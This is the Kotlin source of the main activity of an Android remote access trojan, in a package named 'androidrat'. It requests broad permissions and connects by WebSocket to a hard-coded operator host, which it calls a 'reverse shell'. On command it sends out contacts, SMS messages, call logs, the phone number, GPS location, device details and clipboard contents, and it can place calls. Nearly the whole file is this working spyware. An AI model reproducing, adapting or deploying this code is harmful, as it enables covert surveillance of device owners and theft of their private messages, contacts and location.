package com.nqmgaming.androidrat

import android.Manifest
import android.annotation.SuppressLint
import android.content.ClipDescription
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.CameraDevice
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import androidx.activity.enableEdgeToEdge
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.nqmgaming.androidrat.command.DeviceInfo
import com.nqmgaming.androidrat.data.ApiService
import com.nqmgaming.androidrat.data.dto.DeviceDto
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import org.json.JSONObject
import retrofit2.awaitResponse
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    private lateinit var client: OkHttpClient
    private lateinit var webSocket: WebSocket
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    val help = "Available commands:\n" +
            "1. help - Display this help message\n" +
            "2. info - Display device information\n" +
            "3. location - Get device location\n" +
            "4. ping - Check if device is online\n" +
            "5. phone_number - Get phone number\n" +
            "6. read_contacts - Read contacts\n" +
            "7. read_sms - Read SMS\n" +
            "8. read_call_logs - Read call logs\n" +
            "9. call - Make a call\n" +
            "10. sms - Send SMS\n" +
            "11. read_clipboard - Read clipboard content\n"

    @Inject
    lateinit var apiService: ApiService

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!arePermissionsGranted()) {
            ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
        }
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        client = OkHttpClient()
        val request = Request.Builder().url("ws://192.168.0.199:5525").build()
        val listener = EchoWebSocketListener()
        webSocket = client.newWebSocket(request, listener)

        sendRegistrationRequest()

    }

    private inner class EchoWebSocketListener : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            // Send Device Info
            val message: String =
                "Hello there, welcome to reverse shell of ${Build.MODEL} \n" + help
            webSocket.send(message)
        }

        @SuppressLint("Range")
        @RequiresApi(Build.VERSION_CODES.M)
        override fun onMessage(webSocket: WebSocket, text: String) {
            runOnUiThread {
                println("Received: $text")
            }
            when (text) {
                "help" -> {
                    webSocket.send(help)
                }

                "ping" -> {
                    webSocket.send("pong")
                }

                "info" -> {
                    val info = DeviceInfo.getDeviceInfo()
                    webSocket.send(info)
                }

                "location" -> {
                    CoroutineScope(Dispatchers.IO).launch {

                        // check if location permission is granted
                        if (ContextCompat.checkSelfPermission(
                                applicationContext,
                                Manifest.permission.ACCESS_FINE_LOCATION
                            ) == PackageManager.PERMISSION_GRANTED
                        ) {
                            withContext(Dispatchers.Main) {
                                println("Location permission granted")
                            }
                        } else {
                            withContext(Dispatchers.Main) {
                                println("Location permission not granted")
                            }
                            return@launch
                        }

                        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                            if (location != null) {
                                // Logic to handle location object
                                try {
                                    val stringBuilder = StringBuilder()
                                    stringBuilder.append("{\n")
                                    stringBuilder.append("  \"latitude\": ${location.latitude},\n")
                                    stringBuilder.append("  \"longitude\": ${location.longitude},\n")
                                    stringBuilder.append("  \"accuracy\": ${location.accuracy},\n")
                                    stringBuilder.append("  \"altitude\": ${location.altitude},\n")
                                    stringBuilder.append("  \"speed\": ${location.speed},\n")
                                    stringBuilder.append("  \"time\": ${location.time},\n")
                                    stringBuilder.append("  \"provider\": \"${location.provider}\",\n")
                                    stringBuilder.append("  \"bearing\": ${location.bearing},\n")
                                    stringBuilder.append("  \"GoogleMap Link\": \"https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}\"\n")
                                    stringBuilder.append("}")
                                    webSocket.send(stringBuilder.toString())
                                } catch (e: Exception) {
                                    e.printStackTrace()
                                }
                            }
                        }
                    }
                }

                "phone_number" -> {
                    val telephoneManager =
                        getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    val phoneNumber = "Target phone number: ${telephoneManager.line1Number}"
                    webSocket.send(phoneNumber)
                }

                "read_contacts" -> {
                    var contacts = ""
                    val cursor = contentResolver.query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        null,
                        null,
                        null
                    )
                    while (cursor!!.moveToNext()) {

                        val name =
                            cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val number =
                            cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                        contacts += "Name: $name\nNumber: $number\n\n"
                    }
                    cursor.close()
                    webSocket.send(contacts)
                }

                "read_sms" -> {
                    var sms = ""
                    val cursor = contentResolver.query(
                        android.provider.Telephony.Sms.CONTENT_URI,
                        null,
                        null,
                        null,
                        null
                    )
                    while (cursor!!.moveToNext()) {
                        val address =
                            cursor.getString(cursor.getColumnIndex(android.provider.Telephony.Sms.ADDRESS))
                        val body =
                            cursor.getString(cursor.getColumnIndex(android.provider.Telephony.Sms.BODY))
                        sms += "Address: $address\nBody: $body\n\n"
                    }
                    cursor.close()
                    webSocket.send(sms)
                }

                "read_call_logs" -> {
                    var callLogs = ""
                    val cursor = contentResolver.query(
                        android.provider.CallLog.Calls.CONTENT_URI,
                        null,
                        null,
                        null,
                        null
                    )
                    while (cursor!!.moveToNext()) {
                        val number =
                            cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
                        val name =
                            cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME))
                        val duration =
                            cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION))
                        callLogs += "Name: $name\nNumber: $number\nDuration: $duration\n\n"
                    }
                    cursor.close()
                    webSocket.send(callLogs)
                }

                "call" -> {
                    val number = "+1234567890"
                    val intent = Intent(Intent.ACTION_CALL)
                    intent.data = Uri.parse("tel:$number")
                    startActivity(intent)
                }

                "sms" -> {
                    val number = "+1234567890"
                    val message = "Hello, this is a test message"
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse("sms:$number"))
                    intent.putExtra("sms_body", message)
                    startActivity(intent)
                }

                "read_clipboard" -> {
                    var result: String? = null
                    val clipboardManager =
                        getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager?
                    if (clipboardManager?.hasPrimaryClip() == true) {
                        val clip = clipboardManager.primaryClip
                        if (clip?.description?.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN) == true) {
                            val item = clip.getItemAt(0)
                            result = item.text.toString()
                        }
                    }

                    webSocket.send(result ?: "No text found in clipboard")
                }

                else -> {
                    webSocket.send("Unknown command")
                }
            }
        }

        override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
            runOnUiThread {
                println("Received bytes: $bytes")
            }
        }

        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
            webSocket.close(1000, null)
            println("Closing: $code / $reason")
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: okhttp3.Response?) {
            println("Error: " + t.message)
        }
    }

    // Request to send registration request
    @RequiresApi(Build.VERSION_CODES.M)
    private fun sendRegistrationRequest() {
        val deviceInfo = DeviceInfo.getDeviceInfo()
        val deviceDto = DeviceDto(
            id = Build.ID,
            name = Build.MODEL,
            os = "Android",
            sdk = Build.VERSION.SDK_INT,
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiService.register(deviceDto)
                response.awaitResponse().let {
                    if (it.isSuccessful) {
                        println("Device registered successfully")
                    } else {
                        println("Failed to register device: ${it.errorBody()?.string()}")
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun arePermissionsGranted(): Boolean {
        return APP_PERMISSION.all { permission ->
            ContextCompat.checkSelfPermission(
                applicationContext,
                permission
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    companion object {
        val APP_PERMISSION = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_NUMBERS
        )
    }

    override fun onResume() {
        super.onResume()
        if (!arePermissionsGranted()) {
            ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        webSocket.close(1000, null)
    }


}


